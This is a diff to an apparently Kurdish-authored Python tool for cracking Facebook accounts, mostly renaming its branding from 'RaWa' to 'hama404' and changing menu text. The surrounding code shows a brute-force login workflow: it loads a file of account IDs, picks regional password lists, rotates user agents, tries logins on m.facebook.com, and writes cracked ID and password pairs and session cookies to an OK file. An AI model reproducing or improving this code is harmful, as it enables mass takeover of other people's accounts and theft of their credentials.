@@ -277,15 +277,8 @@ def animation(u):
     
 #------------------[ LOGO-FOT_HAMA ]-----------------#
 logo ="""
-########:::::'###::::'##:::::'##::::'###::::
- ##.... ##:::'## ##::: ##:'##: ##:::'## ##:::
- ##:::: ##::'##:. ##:: ##: ##: ##::'##:. ##::
- ########::'##:::. ##: ##: ##: ##:'##:::. ##:
- ##.. ##::: #########: ##: ##: ##: #########:
- ##::. ##:: ##.... ##: ##: ##: ##: ##.... ##:
- ##:::. ##: ##:::: ##:. ###. ###:: ##:::: ##:
-..:::::..::..:::::..:::...::...:::..:::::..::
-     UPDATE BY - RaWa"""
+WELCOME TOOL hama404
+👍🏻👍🏻"""
 os.system('clear')
 print(logo)
 pass
@@ -340,9 +333,9 @@ class jalan:
 def menu():
     os.system('clear')
     print(logo)
-    print(f"""\033[1;92m[1] CRACK FILE """)
-    print("""\033[1;93m[0] EXIT """)
-    BALEN = input('\033[1;92mCHOOSE :  ')
+    print('\x1b[1;91m[ 1 ] CRACK FILE')
+    #print("""\033[1;93m[0] EXIT """)
+    BALEN = input('\033[1;92mSELET :  ')
     if BALEN in ['111']:
         login()
         dump_massal()
@@ -363,7 +356,7 @@ def menu():
 #-------------[ CRACK-FROM-FILE ]------------------#
  
 def crack_file():
-    o = input('\033[1;92mEnter Your File Name :\033[1;92m ')
+    o = input ('\n LECTION FILE : ') 
     try:lin = open(o).read().splitlines()
     except:
         animation(' [×] FILE NOT FOUND')
@@ -376,9 +369,12 @@ def crack_file():
 #-------------[ PENGATURAN-IDZ ]---------------#
  
 def setting():
-    print("\033[1;93m[ 1 ] PASS ARAB")
-    print("\033[1;92m[ 2 ] PASS KURD [ BEST ]")
-    hu = input('\033[1;92m\033[1;92m\033[1;92mCHOOSE :\033[1;92m ')
+    print(f'''{b}
+  [1] FAECBOOK  V1
+  [2]  FAECBOOK V2
+  [3] FACEBOOK V3
+''')
+    hu = input('\nHalbzhera : ')
     if hu in ['1','01']:
         for tua in sorted(id):
             id2.append(tua)
@@ -399,8 +395,8 @@ def setting():
         for bacot in id:
             xx = random.randint(0,len(id2))
             id2.insert(xx,bacot)
-    print("\033[1;92m[ 1 ] METHOD [ BEST ]")
-    hc = input('\033[1;92m[\033[1;92m•\033[1;92m] CHOOSE : ')
+    print('m.facebook.com')
+    hc = input('\nHalbzhera : ')
     if hc in ['1','01']:
         method.append('mobile')
     elif hc in ['2','02']:
@@ -486,7 +482,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r \033[1;37mRaWa-𝑻𝒆𝒔𝒕🦅]\033[1;37m{Z}{b}{loop}{Z}|{b}{len(id)} \x1b[38;5;43m[\x1b[38;5;48mOK∙{ok}\x1b[38;5;43m] {P}{'{:.0%}'.format(loop/float(len(id)))}    "),
+    sys.stdout.write(f"\r \033[1;37mHaMa-404❤🖤🔥]\033[1;37m{Z}{b}{loop}{Z}|{b}{len(id)} \x1b[38;5;43m[\x1b[38;5;48mLIVE🪙∙{ok}\x1b[38;5;43m] {P}{'{:.0%}'.format(loop/float(len(id)))}    "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -553,7 +549,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\x1b[32[RaWa-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
+                print(f'\r\033[1;92m[ Live - Hama404] {idf}|{pw} ')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 os.system('espeak -a 300 " RaWa CRACKED OK ID"')
                 cek_SURCHY(kuki)
